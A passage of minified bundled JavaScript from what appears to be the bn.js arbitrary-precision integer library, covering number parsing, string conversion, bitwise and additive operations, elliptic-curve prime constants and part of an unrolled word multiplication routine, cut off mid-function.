            function l(e, t, n) { n.negative = t.negative ^ e.negative, n.length = e.length + t.length; for (var i = 0, r = 0, o = 0; o < n.length - 1; o++) { var a = r;
                    r = 0; for (var s = 67108863 & i, c = Math.min(o, t.length - 1), u = Math.max(0, o - e.length + 1); u <= c; u++) { var l = o - u,
                            d = 0 | e.words[l],
                            f = 0 | t.words[u],
                            h = d * f,
                            p = 67108863 & h;
                        a = a + (h / 67108864 | 0) | 0, p = p + s | 0, s = 67108863 & p, a = a + (p >>> 26) | 0, r += a >>> 26, a &= 67108863 } n.words[o] = s, i = a, a = r } return 0 !== i ? n.words[o] = i : n.length--, n.strip() }

            function d(e, t, n) { return (new f).mulp(e, t, n) }

            function f(e, t) { this.x = e, this.y = t }

            function h(e, t) { this.name = e, this.p = new o(t, 16), this.n = this.p.bitLength(), this.k = new o(1).iushln(this.n).isub(this.p), this.tmp = this._tmp() }

            function p() { h.call(this, "k256", "ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffe fffffc2f") }

            function b() { h.call(this, "p224", "ffffffff ffffffff ffffffff ffffffff 00000000 00000000 00000001") }

            function m() { h.call(this, "p192", "ffffffff ffffffff ffffffff fffffffe ffffffff ffffffff") }

            function g() { h.call(this, "25519", "7fffffffffffffff ffffffffffffffff ffffffffffffffff ffffffffffffffed") }

            function v(e) { if ("string" == typeof e) { var t = o._prime(e);
                    this.m = t.p, this.prime = t } else i(e.gtn(1), "modulus must be greater than 1"), this.m = e, this.prime = null }

            function y(e) { v.call(this, e), this.shift = this.m.bitLength(), this.shift % 26 != 0 && (this.shift += 26 - this.shift % 26), this.r = new o(1).iushln(this.shift), this.r2 = this.imod(this.r.sqr()), this.rinv = this.r._invmp(this.m), this.minv = this.rinv.mul(this.r).isubn(1).div(this.m), this.minv = this.minv.umod(this.r), this.minv = this.r.sub(this.minv) } "object" == typeof e ? e.exports = o : t.BN = o, o.BN = o, o.wordSize = 26; var w; try { w = n(115).Buffer } catch (e) {} o.isBN = function(e) { return e instanceof o || null !== e && "object" == typeof e && e.constructor.wordSize === o.wordSize && Array.isArray(e.words) }, o.max = function(e, t) { return e.cmp(t) > 0 ? e : t }, o.min = function(e, t) { return e.cmp(t) < 0 ? e : t }, o.prototype._init = function(e, t, n) { if ("number" == typeof e) return this._initNumber(e, t, n); if ("object" == typeof e) return this._initArray(e, t, n); "hex" === t && (t = 16), i(t === (0 | t) && t >= 2 && t <= 36), e = e.toString().replace(/\s+/g, ""); var r = 0; "-" === e[0] && r++, 16 === t ? this._parseHex(e, r) : this._parseBase(e, t, r), "-" === e[0] && (this.negative = 1), this.strip(), "le" === n && this._initArray(this.toArray(), t, n) }, o.prototype._initNumber = function(e, t, n) { e < 0 && (this.negative = 1, e = -e), e < 67108864 ? (this.words = [67108863 & e], this.length = 1) : e < 4503599627370496 ? (this.words = [67108863 & e, e / 67108864 & 67108863], this.length = 2) : (i(e < 9007199254740992), this.words = [67108863 & e, e / 67108864 & 67108863, 1], this.length = 3), "le" === n && this._initArray(this.toArray(), t, n) }, o.prototype._initArray = function(e, t, n) { if (i("number" == typeof e.length), e.length <= 0) return this.words = [0], this.length = 1, this;
                this.length = Math.ceil(e.length / 3), this.words = new Array(this.length); for (var r = 0; r < this.length; r++) this.words[r] = 0; var o, a, s = 0; if ("be" === n)
                    for (r = e.length - 1, o = 0; r >= 0; r -= 3) a = e[r] | e[r - 1] << 8 | e[r - 2] << 16, this.words[o] |= a << s & 67108863, this.words[o + 1] = a >>> 26 - s & 67108863, (s += 24) >= 26 && (s -= 26, o++);
                else if ("le" === n)
                    for (r = 0, o = 0; r < e.length; r += 3) a = e[r] | e[r + 1] << 8 | e[r + 2] << 16, this.words[o] |= a << s & 67108863, this.words[o + 1] = a >>> 26 - s & 67108863, (s += 24) >= 26 && (s -= 26, o++); return this.strip() }, o.prototype._parseHex = function(e, t) { this.length = Math.ceil((e.length - t) / 6), this.words = new Array(this.length); for (var n = 0; n < this.length; n++) this.words[n] = 0; var i, r, o = 0; for (n = e.length - 6, i = 0; n >= t; n -= 6) r = a(e, n, n + 6), this.words[i] |= r << o & 67108863, this.words[i + 1] |= r >>> 26 - o & 4194303, (o += 24) >= 26 && (o -= 26, i++);
                n + 6 !== t && (r = a(e, t, n + 6), this.words[i] |= r << o & 67108863, this.words[i + 1] |= r >>> 26 - o & 4194303), this.strip() }, o.prototype._parseBase = function(e, t, n) { this.words = [0], this.length = 1; for (var i = 0, r = 1; r <= 67108863; r *= t) i++;
                i--, r = r / t | 0; for (var o = e.length - n, a = o % i, c = Math.min(o, o - a) + n, u = 0, l = n; l < c; l += i) u = s(e, l, l + i, t), this.imuln(r), this.words[0] + u < 67108864 ? this.words[0] += u : this._iaddn(u); if (0 !== a) { var d = 1; for (u = s(e, l, e.length, t), l = 0; l < a; l++) d *= t;
                    this.imuln(d), this.words[0] + u < 67108864 ? this.words[0] += u : this._iaddn(u) } }, o.prototype.copy = function(e) { e.words = new Array(this.length); for (var t = 0; t < this.length; t++) e.words[t] = this.words[t];
                e.length = this.length, e.negative = this.negative, e.red = this.red }, o.prototype.clone = function() { var e = new o(null); return this.copy(e), e }, o.prototype._expand = function(e) { for (; this.length < e;) this.words[this.length++] = 0; return this }, o.prototype.strip = function() { for (; this.length > 1 && 0 === this.words[this.length - 1];) this.length--; return this._normSign() }, o.prototype._normSign = function() { return 1 === this.length && 0 === this.words[0] && (this.negative = 0), this }, o.prototype.inspect = function() { return (this.red ? "<BN-R: " : "<BN: ") + this.toString(16) + ">" }; var x = ["", "0", "00", "000", "0000", "00000", "000000", "0000000", "00000000", "000000000", "0000000000", "00000000000", "000000000000", "0000000000000", "00000000000000", "000000000000000", "0000000000000000", "00000000000000000", "000000000000000000", "0000000000000000000", "00000000000000000000", "000000000000000000000", "0000000000000000000000", "00000000000000000000000", "000000000000000000000000", "0000000000000000000000000"],
                S = [0, 0, 25, 16, 12, 11, 10, 9, 8, 8, 7, 7, 7, 7, 6, 6, 6, 6, 6, 6, 6, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5],
                _ = [0, 0, 33554432, 43046721, 16777216, 48828125, 60466176, 40353607, 16777216, 43046721, 1e7, 19487171, 35831808, 62748517, 7529536, 11390625, 16777216, 24137569, 34012224, 47045881, 64e6, 4084101, 5153632, 6436343, 7962624, 9765625, 11881376, 14348907, 17210368, 20511149, 243e5, 28629151, 33554432, 39135393, 45435424, 52521875, 60466176];
            o.prototype.toString = function(e, t) { e = e || 10, t = 0 | t || 1; var n; if (16 === e || "hex" === e) { n = ""; for (var r = 0, o = 0, a = 0; a < this.length; a++) { var s = this.words[a],
                            c = (16777215 & (s << r | o)).toString(16);
                        o = s >>> 24 - r & 16777215, n = 0 !== o || a !== this.length - 1 ? x[6 - c.length] + c + n : c + n, r += 2, r >= 26 && (r -= 26, a--) } for (0 !== o && (n = o.toString(16) + n); n.length % t != 0;) n = "0" + n; return 0 !== this.negative && (n = "-" + n), n } if (e === (0 | e) && e >= 2 && e <= 36) { var u = S[e],
                        l = _[e];
                    n = ""; var d = this.clone(); for (d.negative = 0; !d.isZero();) { var f = d.modn(l).toString(e);
                        d = d.idivn(l), n = d.isZero() ? f + n : x[u - f.length] + f + n } for (this.isZero() && (n = "0" + n); n.length % t != 0;) n = "0" + n; return 0 !== this.negative && (n = "-" + n), n } i(!1, "Base should be between 2 and 36") }, o.prototype.toNumber = function() { var e = this.words[0]; return 2 === this.length ? e += 67108864 * this.words[1] : 3 === this.length && 1 === this.words[2] ? e += 4503599627370496 + 67108864 * this.words[1] : this.length > 2 && i(!1, "Number can only safely store up to 53 bits"), 0 !== this.negative ? -e : e }, o.prototype.toJSON = function() { return this.toString(16) }, o.prototype.toBuffer = function(e, t) { return i(void 0 !== w), this.toArrayLike(w, e, t) }, o.prototype.toArray = function(e, t) { return this.toArrayLike(Array, e, t) }, o.prototype.toArrayLike = function(e, t, n) { var r = this.byteLength(),
                    o = n || Math.max(1, r);
                i(r <= o, "byte array longer than desired length"), i(o > 0, "Requested array length <= 0"), this.strip(); var a, s, c = "le" === t,
                    u = new e(o),
                    l = this.clone(); if (c) { for (s = 0; !l.isZero(); s++) a = l.andln(255), l.iushrn(8), u[s] = a; for (; s < o; s++) u[s] = 0 } else { for (s = 0; s < o - r; s++) u[s] = 0; for (s = 0; !l.isZero(); s++) a = l.andln(255), l.iushrn(8), u[o - s - 1] = a } return u }, Math.clz32 ? o.prototype._countBits = function(e) { return 32 - Math.clz32(e) } : o.prototype._countBits = function(e) { var t = e,
                    n = 0; return t >= 4096 && (n += 13, t >>>= 13), t >= 64 && (n += 7, t >>>= 7), t >= 8 && (n += 4, t >>>= 4), t >= 2 && (n += 2, t >>>= 2), n + t }, o.prototype._zeroBits = function(e) { if (0 === e) return 26; var t = e,
                    n = 0; return 0 == (8191 & t) && (n += 13, t >>>= 13), 0 == (127 & t) && (n += 7, t >>>= 7), 0 == (15 & t) && (n += 4, t >>>= 4), 0 == (3 & t) && (n += 2, t >>>= 2), 0 == (1 & t) && n++, n }, o.prototype.bitLength = function() { var e = this.words[this.length - 1],
                    t = this._countBits(e); return 26 * (this.length - 1) + t }, o.prototype.zeroBits = function() { if (this.isZero()) return 0; for (var e = 0, t = 0; t < this.length; t++) { var n = this._zeroBits(this.words[t]); if (e += n, 26 !== n) break } return e }, o.prototype.byteLength = function() { return Math.ceil(this.bitLength() / 8) }, o.prototype.toTwos = function(e) { return 0 !== this.negative ? this.abs().inotn(e).iaddn(1) : this.clone() }, o.prototype.fromTwos = function(e) { return this.testn(e - 1) ? this.notn(e).iaddn(1).ineg() : this.clone() }, o.prototype.isNeg = function() { return 0 !== this.negative }, o.prototype.neg = function() { return this.clone().ineg() }, o.prototype.ineg = function() { return this.isZero() || (this.negative ^= 1), this }, o.prototype.iuor = function(e) { for (; this.length < e.length;) this.words[this.length++] = 0; for (var t = 0; t < e.length; t++) this.words[t] = this.words[t] | e.words[t]; return this.strip() }, o.prototype.ior = function(e) { return i(0 == (this.negative | e.negative)), this.iuor(e) }, o.prototype.or = function(e) { return this.length > e.length ? this.clone().ior(e) : e.clone().ior(this) }, o.prototype.uor = function(e) { return this.length > e.length ? this.clone().iuor(e) : e.clone().iuor(this) }, o.prototype.iuand = function(e) { var t;
                t = this.length > e.length ? e : this; for (var n = 0; n < t.length; n++) this.words[n] = this.words[n] & e.words[n]; return this.length = t.length, this.strip() }, o.prototype.iand = function(e) { return i(0 == (this.negative | e.negative)), this.iuand(e) }, o.prototype.and = function(e) { return this.length > e.length ? this.clone().iand(e) : e.clone().iand(this) }, o.prototype.uand = function(e) { return this.length > e.length ? this.clone().iuand(e) : e.clone().iuand(this) }, o.prototype.iuxor = function(e) { var t, n;
                this.length > e.length ? (t = this, n = e) : (t = e, n = this); for (var i = 0; i < n.length; i++) this.words[i] = t.words[i] ^ n.words[i]; if (this !== t)
                    for (; i < t.length; i++) this.words[i] = t.words[i]; return this.length = t.length, this.strip() }, o.prototype.ixor = function(e) { return i(0 == (this.negative | e.negative)), this.iuxor(e) }, o.prototype.xor = function(e) { return this.length > e.length ? this.clone().ixor(e) : e.clone().ixor(this) }, o.prototype.uxor = function(e) { return this.length > e.length ? this.clone().iuxor(e) : e.clone().iuxor(this) }, o.prototype.inotn = function(e) { i("number" == typeof e && e >= 0); var t = 0 | Math.ceil(e / 26),
                    n = e % 26;
                this._expand(t), n > 0 && t--; for (var r = 0; r < t; r++) this.words[r] = 67108863 & ~this.words[r]; return n > 0 && (this.words[r] = ~this.words[r] & 67108863 >> 26 - n), this.strip() }, o.prototype.notn = function(e) { return this.clone().inotn(e) }, o.prototype.setn = function(e, t) { i("number" == typeof e && e >= 0); var n = e / 26 | 0,
                    r = e % 26; return this._expand(n + 1), this.words[n] = t ? this.words[n] | 1 << r : this.words[n] & ~(1 << r), this.strip() }, o.prototype.iadd = function(e) { var t; if (0 !== this.negative && 0 === e.negative) return this.negative = 0, t = this.isub(e), this.negative ^= 1, this._normSign(); if (0 === this.negative && 0 !== e.negative) return e.negative = 0, t = this.isub(e), e.negative = 1, t._normSign(); var n, i;
                this.length > e.length ? (n = this, i = e) : (n = e, i = this); for (var r = 0, o = 0; o < i.length; o++) t = (0 | n.words[o]) + (0 | i.words[o]) + r, this.words[o] = 67108863 & t, r = t >>> 26; for (; 0 !== r && o < n.length; o++) t = (0 | n.words[o]) + r, this.words[o] = 67108863 & t, r = t >>> 26; if (this.length = n.length, 0 !== r) this.words[this.length] = r, this.length++;
                else if (n !== this)
                    for (; o < n.length; o++) this.words[o] = n.words[o]; return this }, o.prototype.add = function(e) { var t; return 0 !== e.negative && 0 === this.negative ? (e.negative = 0, t = this.sub(e), e.negative ^= 1, t) : 0 === e.negative && 0 !== this.negative ? (this.negative = 0, t = e.sub(this), this.negative = 1, t) : this.length > e.length ? this.clone().iadd(e) : e.clone().iadd(this) }, o.prototype.isub = function(e) { if (0 !== e.negative) { e.negative = 0; var t = this.iadd(e); return e.negative = 1, t._normSign() } if (0 !== this.negative) return this.negative = 0, this.iadd(e), this.negative = 1, this._normSign(); var n = this.cmp(e); if (0 === n) return this.negative = 0, this.length = 1, this.words[0] = 0, this; var i, r;
                n > 0 ? (i = this, r = e) : (i = e, r = this); for (var o = 0, a = 0; a < r.length; a++) t = (0 | i.words[a]) - (0 | r.words[a]) + o, o = t >> 26, this.words[a] = 67108863 & t; for (; 0 !== o && a < i.length; a++) t = (0 | i.words[a]) + o, o = t >> 26, this.words[a] = 67108863 & t; if (0 === o && a < i.length && i !== this)
                    for (; a < i.length; a++) this.words[a] = i.words[a]; return this.length = Math.max(this.length, a), i !== this && (this.negative = 1), this.strip() }, o.prototype.sub = function(e) { return this.clone().isub(e) }; var k = function(e, t, n) { var i, r, o, a = e.words,
                    s = t.words,
                    c = n.words,
                    u = 0,
                    l = 0 | a[0],
                    d = 8191 & l,
                    f = l >>> 13,
                    h = 0 | a[1],
                    p = 8191 & h,
                    b = h >>> 13,
                    m = 0 | a[2],
                    g = 8191 & m,
                    v = m >>> 13,
                    y = 0 | a[3],
                    w = 8191 & y,
                    x = y >>> 13,
                    S = 0 | a[4],
                    _ = 8191 & S,
                    k = S >>> 13,
                    C = 0 | a[5],
                    A = 8191 & C,
                    E = C >>> 13,
                    T = 0 | a[6],
                    M = 8191 & T,
                    R = T >>> 13,
                    P = 0 | a[7],
                    I = 8191 & P,
                    D = P >>> 13,
                    O = 0 | a[8],
                    j = 8191 & O,
                    q = O >>> 13,
                    B = 0 | a[9],
                    L = 8191 & B,
                    N = B >>> 13,
                    F = 0 | s[0],
                    z = 8191 & F,
                    U = F >>> 13,
                    H = 0 | s[1],
                    V = 8191 & H,
                    W = H >>> 13,
                    K = 0 | s[2],
                    Y = 8191 & K,
                    X = K >>> 13,
                    $ = 0 | s[3],
                    G = 8191 & $,
                    J = $ >>> 13,
                    Z = 0 | s[4],
                    Q = 8191 & Z,
                    ee = Z >>> 13,
                    te = 0 | s[5],
                    ne = 8191 & te,
                    ie = te >>> 13,
                    re = 0 | s[6],
                    oe = 8191 & re,
                    ae = re >>> 13,
                    se = 0 | s[7],
                    ce = 8191 & se,
                    ue = se >>> 13,
                    le = 0 | s[8],
                    de = 8191 & le,
                    fe = le >>> 13,
                    he = 0 | s[9],
                    pe = 8191 & he,
                    be = he >>> 13;
                n.negative = e.negative ^ t.negative, n.length = 19, i = Math.imul(d, z), r = Math.imul(d, U), r = r + Math.imul(f, z) | 0, o = Math.imul(f, U); var me = (u + i | 0) + ((8191 & r) << 13) | 0;
                u = (o + (r >>> 13) | 0) + (me >>> 26) | 0, me &= 67108863, i = Math.imul(p, z), r = Math.imul(p, U), r = r + Math.imul(b, z) | 0, o = Math.imul(b, U), i = i + Math.imul(d, V) | 0, r = r + Math.imul(d, W) | 0, r = r + Math.imul(f, V) | 0, o = o + Math.imul(f, W) | 0; var ge = (u + i | 0) + ((8191 & r) << 13) | 0;
                u = (o + (r >>> 13) | 0) + (ge >>> 26) | 0, ge &= 67108863, i = Math.imul(g, z), r = Math.imul(g, U), r = r + Math.imul(v, z) | 0, o = Math.imul(v, U), i = i + Math.imul(p, V) | 0, r = r + Math.imul(p, W) | 0, r = r + Math.imul(b, V) | 0, o = o + Math.imul(b, W) | 0, i = i + Math.imul(d, Y) | 0, r = r + Math.imul(d, X) | 0, r = r + Math.imul(f, Y) | 0, o = o + Math.imul(f, X) | 0; var ve = (u + i | 0) + ((8191 & r) << 13) | 0;
                u = (o + (r >>> 13) | 0) + (ve >>> 26) | 0, ve &= 67108863, i = Math.imul(w, z), r = Math.imul(w, U), r = r + Math.imul(x, z) | 0, o = Math.imul(x, U), i = i + Math.imul(g, V) | 0, r = r + Math.imul(g, W) | 0, r = r + Math.imul(v, V) | 0, o = o + Math.imul(v, W) | 0, i = i + Math.imul(p, Y) | 0, r = r + Math.imul(p, X) | 0, r = r + Math.imul(b, Y) | 0, o = o + Math.imul(b, X) | 0, i = i + Math.imul(d, G) | 0, r = r + Math.imul(d, J) | 0, r = r + Math.imul(f, G) | 0, o = o + Math.imul(f, J) | 0; var ye = (u + i | 0) + ((8191 & r) << 13) | 0;
                u = (o + (r >>> 13) | 0) + (ye >>> 26) | 0, ye &= 67108863, i = Math.imul(_, z), r = Math.imul(_, U), r = r + Math.imul(k, z) | 0, o = Math.imul(k, U), i = i + Math.imul(w, V) | 0, r = r + Math.imul(w, W) | 0, r = r + Math.imul(x, V) | 0, o = o + Math.imul(x, W) | 0, i = i + Math.imul(g, Y) | 0, r = r + Math.imul(g, X) | 0, r = r + Math.imul(v, Y) | 0, o = o + Math.imul(v, X) | 0, i = i + Math.imul(p, G) | 0, r = r + Math.imul(p, J) | 0, r = r + Math.imul(b, G) | 0, o = o + Math.imul(b, J) | 0, i = i + Math.imul(d, Q) | 0, r = r + Math.imul(d, ee) | 0, r = r + Math.imul(f, Q) | 0, o = o + Math.imul(f, ee) | 0; var we = (u + i | 0) + ((8191 & r) << 13) | 0;
                u = (o + (r >>> 13) | 0) + (we >>> 26) | 0, we &= 67108863, i = Math.imul(A, z), r = Math.imul(A, U), r = r + Math.imul(E, z) | 0, o = Math.imul(E, U), i = i + Math.imul(_, V) | 0, r = r + Math.imul(_, W) | 0, r = r + Math.imul(k, V) | 0, o = o + Math.imul(k, W) | 0, i = i + Math.imul(w, Y) | 0, r = r + Math.imul(w, X) | 0, r = r + Math.imul(x, Y) | 0, o = o + Math.imul(x, X) | 0, i = i + Math.imul(g, G) | 0, r = r + Math.imul(g, J) | 0, r = r + Math.imul(v, G) | 0, o = o + Math.imul(v, J) | 0, i = i + Math.imul(p, Q) | 0, r = r + Math.imul(p, ee) | 0, r = r + Math.imul(b, Q) | 0, o = o + Math.imul(b, ee) | 0, i = i + Math.imul(d, ne) | 0, r = r + Math.imul(d, ie) | 0, r = r + Math.imul(f, ne) | 0, o = o + Math.imul(f, ie) | 0; var xe = (u + i | 0) + ((8191 & r) << 13) | 0;
                u = (o + (r >>> 13) | 0) + (xe >>> 26) | 0, xe &= 67108863, i = Math.imul(M, z), r = Math.imul(M, U), r = r + Math.imul(R, z) | 0, o = Math.imul(R, U), i = i + Math.imul(A, V) | 0, r = r + Math.imul(A, W) | 0, r = r + Math.imul(E, V) | 0, o = o + Math.imul(E, W) | 0, i = i + Math.imul(_, Y) | 0, r = r + Math.imul(_, X) | 0, r = r + Math.imul(k, Y) | 0, o = o + Math.imul(k, X) | 0, i = i + Math.imul(w, G) | 0, r = r + Math.imul(w, J) | 0, r = r + Math.imul(x, G) | 0, o = o + Math.imul(x, J) | 0, i = i + Math.imul(g, Q) | 0, r = r + Math.imul(g, ee) | 0, r = r + Math.imul(v, Q) | 0, o = o + Math.imul(v, ee) | 0, i = i + Math.imul(p, ne) | 0, r = r + Math.imul(p, ie) | 0, r = r + Math.imul(b, ne) | 0, o = o + Math.imul(b, ie) | 0, i = i + Math.imul(d, oe) | 0, r = r + Math.imul(d, ae) | 0, r = r + Math.imul(f, oe) | 0, o = o + Math.imul(f, ae) | 0; var Se = (u + i | 0) + ((8191 & r) << 13) | 0;
                u = (o + (r >>> 13) | 0) + (Se >>> 26) | 0, Se &= 67108863, i = Math.imul(I, z), r = Math.imul(I, U), r = r + Math.imul(D, z) | 0, o = Math.imul(D, U), i = i + Math.imul(M, V) | 0, r = r + Math.imul(M, W) | 0, r = r + Math.imul(R, V) | 0, o = o + Math.imul(R, W) | 0, i = i + Math.imul(A, Y) | 0, r = r + Math.imul(A, X) | 0, r = r + Math.imul(E, Y) | 0, o = o + Math.imul(E, X) | 0, i = i + Math.imul(_, G) | 0, r = r + Math.imul(_, J) | 0, r = r + Math.imul(k, G) | 0, o = o + Math.imul(k, J) | 0, i = i + Math.imul(w, Q) | 0, r = r + Math.imul(w, ee) | 0, r = r + Math.imul(x, Q) | 0, o = o + Math.imul(x, ee) | 0, i = i + Math.imul(g, ne) | 0, r = r + Math.imul(g, ie) | 0, r = r + Math.imul(v, ne) | 0, o = o + Math.imul(v, ie) | 0, i = i + Math.imul(p, oe) | 0, r = r + Math.imul(p, ae) | 0, r = r + Math.imul(b, oe) | 0, o = o + Math.imul(b, ae) | 0, i = i + Math.imul(d, ce) | 0, r = r + Math.imul(d, ue) | 0, r = r + Math.imul(f, ce) | 0, o = o + Math.imul(f, ue) | 0; var _e = (u + i | 0) + ((8191 & r) << 13) | 0;
                u = (o + (r >>> 13) | 0) + (_e >>> 26) | 0, _e &= 67108863, i = Math.imul(j, z), r = Math.imul(j, U), r = r + Math.imul(q, z) | 0, o = Math.imul(q, U), i = i + Math.imul(I, V) | 0, r = r + Math.imul(I, W) | 0, r = r + Math.imul(D, V) | 0, o = o + Math.imul(D, W) | 0, i = i + Math.imul(M, Y) | 0, r = r + Math.imul(M, X) | 0, r = r + Math.imul(R, Y) | 0, o = o + Math.imul(R, X) | 0, i = i + Math.imul(A, G) | 0, r = r + Math.imul(A, J) | 0, r = r + Math.imul(E, G) | 0, o = o + Math.imul(E, J) | 0, i = i + Math.imul(_, Q) | 0, r = r + Math.imul(_, ee) | 0, r = r + Math.imul(k, Q) | 0, o = o + Math.imul(k, ee) | 0, i = i + Math.imul(w, ne) | 0, r = r + Math.imul(w, ie) | 0, r = r + Math.imul(x, ne) | 0, o = o + Math.imul(x, ie) | 0, i = i + Math.imul(g, oe) | 0, r = r + Math.imul(g, ae) | 0, r = r + Math.imul(v, oe) | 0, o = o + Math.imul(v, ae) | 0, i = i + Math.imul(p, ce) | 0, r = r + Math.imul(p, ue) | 0, r = r + Math.imul(b, ce) | 0, o = o + Math.imul(b, ue) | 0, i = i + Math.imul(d, de) | 0, r = r + Math.imul(d, fe) | 0, r = r + Math.imul(f, de) | 0, o = o + Math.imul(f, fe) | 0; var ke = (u + i | 0) + ((8191 & r) << 13) | 0;
                u = (o + (r >>> 13) | 0) + (ke >>> 26) | 0, ke &= 67108863, i = Math.imul(L, z), r = Math.imul(L, U), r = r + Math.imul(N, z) | 0, o = Math.imul(N, U), i = i + Math.imul(j, V) | 0, r = r + Math.imul(j, W) | 0, r = r + Math.imul(q, V) | 0, o = o + Math.imul(q, W) | 0, i = i + Math.imul(I, Y) | 0, r = r + Math.imul(I, X) | 0, r = r + Math.imul(D, Y) | 0, o = o + Math.imul(D, X) | 0, i = i + Math.imul(M, G) | 0, r = r + Math.imul(M, J) | 0, r = r + Math.imul(R, G) | 0, o = o + Math.imul(R, J) | 0, i = i + Math.imul(A, Q) | 0, r = r + Math.imul(A, ee) | 0, r = r + Math.imul(E, Q) | 0, o = o + Math.imul(E, ee) | 0, i = i + Math.imul(_, ne) | 0, r = r + Math.imul(_, ie) | 0, r = r + Math.imul(k, ne) | 0, o = o + Math.imul(k, ie) | 0, i = i + Math.imul(w, oe) | 0, r = r + Math.imul(w, ae) | 0, r = r + Math.imul(x, oe) | 0, o = o + Math.imul(x, ae) | 0, i = i + Math.imul(g, ce) | 0, r = r + Math.imul(g, ue) | 0, r = r + Math.imul(v, ce) | 0, o = o + Math.imul(v, ue) | 0, i = i + Math.imul(p, de) | 0, r = r + Math.imul(p, fe) | 0, r = r + Math.imul(b, de) | 0, o = o + Math.imul(b, fe) | 0, i = i + Math.imul(d, pe) | 0, r = r + Math.imul(d, be) | 0, r = r + Math.imul(f, pe) | 0, o = o + Math.imul(f, be) | 0; var Ce = (u + i | 0) + ((8191 & r) << 13) | 0;
                u = (o + (r >>> 13) | 0) + (Ce >>> 26) | 0, Ce &= 67108863, i = Math.imul(L, V), r = Math.imul(L, W), r = r + Math.imul(N, V) | 0, o = Math.imul(N, W), i = i + Math.imul(j, Y) | 0, r = r + Math.imul(j, X) | 0, r = r + Math.imul(q, Y) | 0, o = o + Math.imul(q, X) | 0, i = i + Math.imul(I, G) | 0, r = r + Math.imul(I, J) | 0, r = r + Math.imul(D, G) | 0, o = o + Math.imul(D, J) | 0, i = i + Math.imul(M, Q) | 0, r = r + Math.imul(M, ee) | 0, r = r + Math.imul(R, Q) | 0, o = o + Math.imul(R, ee) | 0, i = i + Math.imul(A, ne) | 0, r = r + Math.imul(A, ie) | 0, r = r + Math.imul(E, ne) | 0, o = o + Math.imul(E, ie) | 0, i = i + Math.imul(_, oe) | 0, r = r + Math.imul(_, ae) | 0, r = r + Math.imul(k, oe) | 0, o = o + Math.imul(k, ae) | 0, i = i + Math.imul(w, ce) | 0, r = r + Math.imul(w, ue) | 0, r = r + Math.imul(x, ce) | 0, o = o + Math.imul(x, ue) | 0, i = i + Math.imul(g, de) | 0, r = r + Math.imul(g, fe) | 0, r = r + Math.imul(v, de) | 0, o = o + Math.imul(v, fe) | 0, i = i + Math.imul(p, pe) | 0, r = r + Math.imul(p, be) | 0, r = r + Math.imul(b, pe) | 0, o = o + Math.imul(b, be) | 0; var Ae = (u + i | 0) + ((8191 & r) << 13) | 0;
                u = (o + (r >>> 13) | 0) + (Ae >>> 26) | 0, Ae &= 67108863, i = Math.imul(L, Y), r = Math.imul(L, X), r = r + Math.imul(N, Y) | 0, o = Math.imul(N, X), i = i + Math.imul(j, G) | 0, r = r + Math.imul(j, J) | 0, r = r + Math.imul(q, G) | 0, o = o + Math.imul(q, J) | 0, i = i + Math.imul(I, Q) | 0, r = r + Math.imul(I, ee) | 0, r = r + Math.imul(D, Q) | 0, o = o + Math.imul(D, ee) | 0, i = i + Math.imul(M, ne) | 0, r = r + Math.imul(M, ie) | 0, r = r + Math.imul(R, ne) | 0, o = o + Math.imul(R, ie) | 0, i = i + Math.imul(A, oe) | 0, r = r + Math.imul(A, ae) | 0, r = r + Math.imul(E, oe) | 0, o = o + Math.imul(E, ae) | 0, i = i + Math.imul(_, ce) | 0, r = r + Math.imul(_, ue) | 0, r = r + Math.imul(k, ce) | 0, o = o + Math.imul(k, ue) | 0, i = i + Math.imul(w, de) | 0, r = r + Math.imul(w, fe) | 0, r = r + Math.imul(x, de) | 0, o = o + Math.imul(x, fe) | 0, i = i + Math.imul(g, pe) | 0, r = r + Math.imul(g, be) | 0, r = r + Math.imul(v, pe) | 0, o = o + Math.imul(v, be) | 0; var Ee = (u + i | 0) + ((8191 & r) << 13) | 0;
                u = (o + (r >>> 13) | 0) + (Ee >>> 26) | 0, Ee &= 67108863, i = Math.imul(L, G), r = Math.imul(L, J), r = r + Math.imul(N, G) | 0, o = Math.imul(N, J), i = i + Math.imul(j, Q) | 0, r = r + Math.imul(j, ee) | 0, r = r + Math.imul(q, Q) | 0, o = o + Math.imul(q, ee) | 0, i = i + Math.imul(I, ne) | 0, r = r + Math.imul(I, ie) | 0, r = r + Math.imul(D, ne) | 0, o = o + Math.imul(D, ie) | 0, i = i + Math.imul(M, oe) | 0, r = r + Math.imul(M, ae) | 0, r = r + Math.imul(R, oe) | 0, o = o + Math.imul(R, ae) | 0, i = i + Math.imul(A, ce) | 0, r = r + Math.imul(A, ue) | 0, r = r + Math.imul(E, ce) | 0, o = o + Math.imul(E, ue) | 0, i = i + Math.imul(_, de) | 0, r = r + Math.imul(_, fe) | 0, r = r + Math.imul(k, de) | 0, o = o + Math.imul(k, fe) | 0, i = i + Math.imul(w, pe) | 0, r = r + Math.imul(w, be) | 0, r = r + Math.imul(x, pe) | 0, o = o + Math.imul(x, be) | 0; var Te = (u + i | 0) + ((8191 & r) << 13) | 0;
                u = (o + (r >>> 13) | 0) + (Te >>> 26) | 0, Te &= 67108863, i = Math.imul(L, Q), r = Math.imul(L, ee), r = r + Math.imul(N, Q) | 0, o = Math.imul(N, ee), i = i + Math.imul(j, ne) | 0, r = r + Math.imul(j, ie) | 0, r = r + Math.imul(q, ne) | 0, o = o + Math.imul(q, ie) | 0, i = i + Math.imul(I, oe) | 0, r = r + Math.imul(I, ae) | 0, r = r + Math.imul(D, oe) | 0, o = o + Math.imul(D, ae) | 0, i = i + Math.imul(M, ce) | 0, r = r + Math.imul(M, ue) | 0, r = r + Math.imul(R, ce) | 0, o = o + Math.imul(R, ue) | 0, i = i + Math.imul(A, de) | 0, r = r + Math.imul(A, fe) | 0, r = r + Math.imul(E, de) | 0, o = o + Math.imul(E, fe) | 0, i = i + Math.imul(_, pe) | 0, r = r + Math.imul(_, be) | 0, r = r + Math.imul(k, pe) | 0, o = o + Math.imul(k, be) | 0; var Me = (u + i | 0) + ((8191 & r) << 13) | 0;
